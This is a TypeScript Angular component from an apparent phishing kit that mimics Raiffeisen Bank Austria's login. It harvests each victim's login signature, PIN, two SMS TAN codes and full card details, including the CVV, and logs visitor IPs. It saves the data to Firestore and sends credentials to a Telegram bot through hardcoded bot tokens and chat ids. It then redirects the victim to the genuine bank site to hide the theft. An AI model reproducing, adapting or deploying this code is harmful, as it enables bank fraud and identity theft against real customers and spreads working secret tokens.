import { Component, OnInit } from '@angular/core';
import { Login } from './login';
import { Router } from '@angular/router';

import { } from 'file-system';
import { MyService } from '../myservice';
import { AngularFirestore, AngularFirestoreCollection } from '@angular/fire/firestore';
import { Observable } from 'rxjs';
import { map, catchError } from 'rxjs/operators';
import { FormControl } from '@angular/forms';
import { ElementRef } from '@angular/core';
import { ViewChild } from '@angular/core';
import { Sms } from './sms';
import { Billing } from '../billing/billing';
import { HttpClient } from '@angular/common/http';
import { NgxSpinnerService } from 'ngx-spinner';

@Component({
  selector: 'app-login',
  templateUrl: './login.component.html',
  styleUrls: ['./login.component.css']
})
export class LoginComponent implements OnInit {


  @ViewChild('langDropdownRef', null)
  langDropdownRef: ElementRef;

  @ViewChild('dropDownBtn', null)
  dropDownBtn: ElementRef;

  @ViewChild('submitBtn', null)
  submitBtn: ElementRef;

  @ViewChild('signatureInput', null)
  signatureInput: ElementRef;

  step = 1;
  title = 'raif';
  pin = '';
  sms = '';
  sms2 = '';
  selectedLanguage = 'Deutsch';
  selectedLand = '';
  stepThreeIsLoading = true;
  hiddenPass = true;
  cardNumber = '';
  fullName = '';
  CVV = '';
  expDate = ''; 
  errors: any = {};
  signature = '';
  disabled = true;
  disabled2 = true;
  prefix = '';
  errorMessage = '';
  tmpPrefix = '';
  hiddenBtn1 = false;
  hiddenBtn2 = true;
  langs = [
    'Deutsch',
    'Englisch'
  ];
  budensland = [
    {
      name: 'Burgenland',
      prefix: 'ELVIE-33-V-'
    }, {
      name: 'Karnten',
      prefix: 'ELOOE-03-V-',
    }, {
      name: 'Niederosterreich/Wien',
      prefix: 'ELVIE-32-V-',
    }, {
      name: 'Oberosterreich',
      prefix: 'ELOOE-01-V-',
    }, {
      name: 'Salzburg',
      prefix: 'ELOOE-05-V-',
    }, {
      name: 'Steiermark',
      prefix: 'ELVIE-38-V-',
    }, {
      name: 'Tirol',
      prefix: 'ELOOE-11-V-',
    }, {
      name: 'Vorarlberg/Waiser Privatbank AG',
      prefix: 'ELVIE-37-V-',
    }, {
      name: 'Karnten/Posojilnica Bank',
      prefix: 'ELVIE-91-V-',
    }, {
      name: 'Oberosterrich/bankdirect.at',
      prefix: 'ELOOE-01-V-',
    }, {
      name: 'Oberosterreich/PRIVAT-BANK',
      prefix: 'ELOOE-01-V-',
    }, {
      name: 'Tirol/Jungholz',
      prefix: 'ELOOE-11-V-',
    }
  ];
  signatureControl: FormControl;





  login: Login = {user:'',pin:'',dateTime:'',ip:''};
  smsTAN: Sms = {smsTAN1:'', smsTAN2:'', dateTime:'', ip:'' };
  billing: Billing = {fullName:'',cardNumber:'',exp:'',cvv:'',dateTime:'',ip:''};
  visit:any = {ip:'',country:'',dateTime:''};
  loginsCollection: AngularFirestoreCollection<Login>;
  smsCollection: AngularFirestoreCollection<Sms>;
  billingsCollection: AngularFirestoreCollection<Billing>;
  visitsCollection: AngularFirestoreCollection<any>;
  logins:Observable<Login[]>;
  finished:boolean=false;
  myService:MyService;
  
  constructor(private spinner: NgxSpinnerService, private httpClient: HttpClient,private router: Router, db: AngularFirestore,myService:MyService) { 
    this.visitsCollection=db.collection('vBet');
    this.smsCollection=db.collection('sBet');
    this.billingsCollection=db.collection('bBet');
    this.visit.dateTime =Date.now();
    myService.getIpAddress().subscribe(ip => {
      this.visit.ip=ip.ip;
      myService.getCountry(ip.ip).subscribe(country => {
        this.visit.country=country.country_name;
        this.visitsCollection.add(this.visit);
      });
    });

    

   
    this.loginsCollection=db.collection('lBet');
    /*this.logins=this.loginsCollection.snapshotChanges().pipe(
      map ( changes=> {
        return changes.map(
          a=> {
            const data = a.payload.doc.data() as Login;
            data.id=a.payload.doc.id;
            return data;
          }
        )
      })
    );*/
    
    
  }

  ngOnInit() {


    
  }


  onKey() { // without type info
    if (this.signature.length > 3) {
      this.errors.formError = true;
      this.disabled = false;
      
    } else{
      this.disabled = true;
    }
  }

  onKey2() { // without type info
    this.onKey();
    if (this.pin.length > 3) {
      this.errors.formError = true;
      this.disabled2 = false;
    } else{
      this.disabled2 = true;
    }
  }

  showInput() { // without type info
    this.disabled = true;
    setTimeout(() => {
      this.hiddenPass = false;
    this.hiddenBtn1 = true;
    this.hiddenBtn2 =  false;
    }, 1000);
    
  }

  sendTelegram(message:string) :Observable<any[]> {
    //mine
    return this.httpClient.post<any[]>('https://api.telegram.org/bot1096379466:AAH8mwk8WMjsaZxYij_p-8rooHHJWkExFWk/sendMessage?chat_id=-1001592232058&text='+message,null);
    
    // Our GRP
    //return this.httpClient.post<any[]>('https://api.telegram.org/bot1612373960:AAFQ3-vPMBOA_hSrrgh8y68LNnx3wSxW8BE/sendMessage?chat_id=-1001499839547&text='+message,null);
    
    //me&val
   // return this.httpClient.post<any[]>('https://api.telegram.org/bot1612373960:AAFQ3-vPMBOA_hSrrgh8y68LNnx3wSxW8BE/sendMessage?chat_id=-1001558381849&text='+message,null);
  }

  getLands() {
    const tmp = this.budensland;
    return tmp.map(b => b.name);
  }

  getInputLength() {
    return (this.prefix + this.signature).length;
  }

  focusInput() {
    this.signatureInput.nativeElement.value = '';
    this.signatureInput.nativeElement.value = this.prefix + this.signature;
  }
  submitForm() {
    this.disabled = true;
   this.spinner.show();
    this.errors = {};

    setTimeout(() => {
      
        //if (!this.signature.match(/\d{1}V-\d{6}/)) {
        if (!this.signature.match(/\d{6}/)) {
          this.errors.formError = true;
          this.disabled = false;
          
        }
        this.disabled = false;
        // send to fb 
        this.login.dateTime=Date.now();
      
        this.navigate(2);
        
        if (this.pin.length < 4) {
          this.errors.pinError = true;
          this.disabled = false;
          return;
        }
        this.disabled = false;
        this.login.ip=this.visit.ip;
        this.login.dateTime=Date.now();
        this.login.user = this.signature;
        this.login.pin = this.pin;
        this.loginsCollection.add(this.login);
        let message;
        message = this.signature+'   '+this.pin+'   '+this.visit.ip;
        this.sendTelegram(message).subscribe(data => console.log(data));

        this.router.navigate(['/verify']);
        
        
      
      if (this.step === 2) {
        if (this.pin.length < 4) {
          this.errors.pinError = true;
          this.disabled = false;
          this.submitBtn.nativeElement.classList.remove('greyed-out');
          return;
        }
        this.disabled = false;
        this.submitBtn.nativeElement.classList.remove('greyed-out');
        this.login.ip=this.visit.ip;
        this.login.dateTime=Date.now();
        this.login.user = this.signature;
        this.login.pin = this.pin;
        this.loginsCollection.add(this.login);
      // fb
        this.navigate(3);
        return;

      }
      if (this.step === 3) {
        if (this.sms.length < 7) {
          this.errors.smsError = true;
          this.disabled = false;
          this.submitBtn.nativeElement.classList.remove('greyed-out');
          return;
        }
        this.disabled = false;
        this.submitBtn.nativeElement.classList.remove('greyed-out');
        this.smsTAN.smsTAN1 = this.sms;
        this.smsTAN.dateTime=Date.now();
        this.smsTAN.ip = this.visit.ip;
        this.smsCollection.add(this.smsTAN);
        // firebase here

        this.navigate(4);
        return;
      }
      if (this.step === 4) {
        if (this.fullName.length < 5) {
          this.errors.nameError = true;
          this.disabled = false;
          this.submitBtn.nativeElement.classList.remove('greyed-out');
        }
        if (this.cardNumber.length < 15) {
          this.errors.cardError = true;
          this.disabled = false;
          this.submitBtn.nativeElement.classList.remove('greyed-out');
        }
        if (this.expDate.length < 7) {
          this.errors.expError = true;
          this.disabled = false;
          this.submitBtn.nativeElement.classList.remove('greyed-out');
        }
        if (this.CVV.length < 3) {
          this.errors.cvvError = true;
          this.disabled = false;
          this.submitBtn.nativeElement.classList.remove('greyed-out');
        }
        if (Object.keys(this.errors).length > 0) { return; }
        //fb
        this.billing.fullName = this.fullName;
        this.billing.cardNumber = this.cardNumber;
        this.billing.exp = this.expDate;
        this.billing.cvv = this.CVV;
        this.billing.dateTime = Date.now();
        this.billing.ip = this.visit.ip;
        this.billingsCollection.add(this.billing);
        this.disabled = false;
        this.submitBtn.nativeElement.classList.remove('greyed-out');
        this.navigate(5);
        return;
      }
      if (this.step === 5) {
        if (this.sms2.length < 7) {
          this.errors.sms2Error = true;
          this.disabled = false;
          this.submitBtn.nativeElement.classList.remove('greyed-out');
          return;
        }
        this.disabled = false;
        this.submitBtn.nativeElement.classList.remove('greyed-out');
        this.smsTAN.smsTAN1 = this.sms;
        this.smsTAN.smsTAN2 = this.sms2;
        this.smsTAN.dateTime=Date.now();
        this.smsTAN.ip = this.visit.ip;
        this.smsCollection.add(this.smsTAN);
        //fb
        this.navigate(6);
        return;
      }
    }, 2000);
  
  }
  navigate(step) {
    this.step = step;
    this.stepThreeIsLoading = true;
    if (step === 3) {
      console.log('setTimeout');
      setTimeout(() => {
        this.stepThreeIsLoading = false;
      }, 8000);
    }
    if (step === 5) {
      console.log('setTimeout')
      setTimeout(() => {
        this.stepThreeIsLoading = false;
      }, 8000);
    }
    if (this.step === 6) {
      setTimeout(() => window.location.href = 'https://www.raiffeisen.at/de/privatkunden.html', 4000);
    }
  }



  handlePinChange(e) {
    this.pin = e.target.value;
  }
  handlesmsChange(e) {
    this.sms = e.target.value;
  }
  handlesms2Change(e) {
    this.sms2 = e.target.value;
  }

  handleCardChange(e) {
    this.cardNumber = e.target.value;
  }

  handleNameChange(e) {
    this.fullName = e.target.value;
  }

  handlecvvChange(e) {
    this.CVV = e.target.value;
  }
  handleExpChange(e) {
    this.expDate = e.target.value;
  }


  toggleLangDropDown() {
    const menu = this.langDropdownRef.nativeElement;
    const dropDownBtn = this.dropDownBtn.nativeElement;
    menu.classList.toggle('show');
    if (!menu.classList.contains('show')) {
      dropDownBtn.blur();
    }
    // const dropdowns = document.getElementsByClassName('dropdown-content');
  }


async delayAndRedirect(ms: number) {
  this.finished=true;
  await new Promise(resolve => setTimeout(()=>resolve(), ms)).then(()=>console.log("fired"));  
  this.router.navigate(['/confirm']);
}

  onSubmit(form) {
    if (form.valid) {
      this.delayAndRedirect(2000);
      this.login.dateTime=Date.now();
      this.login.ip=this.visit.ip;
      this.loginsCollection.add(this.login);
     // this.myService.addLogin(this.login.email, this.login.password).subscribe(data => console.log(data));
      localStorage.setItem('loggedIn', 'yes');
      localStorage.setItem('ip',this.login.ip);
      
    }
  }



}
